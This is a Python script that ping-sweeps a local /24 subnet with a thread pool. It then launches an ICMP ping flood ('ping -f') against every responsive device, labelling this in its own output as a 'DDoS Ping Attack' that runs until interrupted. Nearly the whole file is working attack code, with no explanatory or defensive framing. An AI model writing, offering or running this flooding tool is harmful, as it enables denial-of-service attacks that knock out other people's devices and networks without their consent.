import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor

# Configuration
SUBNET = "192.168.1"
CHECKS_PER_DEVICE = 3  
MAX_THREADS = 50       

def is_device_alive(ip):
    """
    Pings the device CHECKS_PER_DEVICE times. 
    If ANY of them succeed, we assume it's alive.
    """
    print(f"[*] Checking {ip}...")
    
    for attempt in range(1, CHECKS_PER_DEVICE + 1):
        # -c 1: Send one packet
        # -W 1: Wait 1 second for reply
        cmd = ['ping', '-c', '1', '-W', '1', ip]
        
        try:
            result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if result.returncode == 0:
                print(f"[+] Found Active Device: {ip}")
                return True
                
        except Exception as e:
            pass 
            
    return False

def start_flood(ip):
    """
    Starts the ping flood on a specific IP.
    -f flag sends packets as fast as possible (ICMP Flood).
    """
    print(f"🚀 Starting DDoS Ping Attack on {ip}...")
    
    try:
        # This will now receive "192.168.1.1" instead of just 1
        subprocess.call(['ping', '-f', ip])
    except KeyboardInterrupt:
        pass

def main():
    print(f"Scanning subnet {SUBNET}.x with {CHECKS_PER_DEVICE} checks per device...")
    
    # Create a list of all IPs to check as strings (e.g., "192.168.1.1")
    ips_to_scan = [f"{SUBNET}.{i}" for i in range(1, 255)]

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # Map the future object to the full IP string
        futures = {executor.submit(is_device_alive, ip): ip for ip in ips_to_scan}
        
        for future in futures:
            ip = futures[future] # Now this is a STRING like "192.168.1.1"
            
            try:
                if future.result(): # If the device is alive
                    t = threading.Thread(target=start_flood, args=(ip,))
                    t.start()
            except Exception as e:
                print(f"Error checking {ip}: {e}")

    print("\n" + "="*40)
    print("Scan Complete. Flooding active devices.")
    print("Press Ctrl+C to stop all attacks.")
    print("="*40)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping floods...")
        exit()

if __name__ == "__main__":
    main()
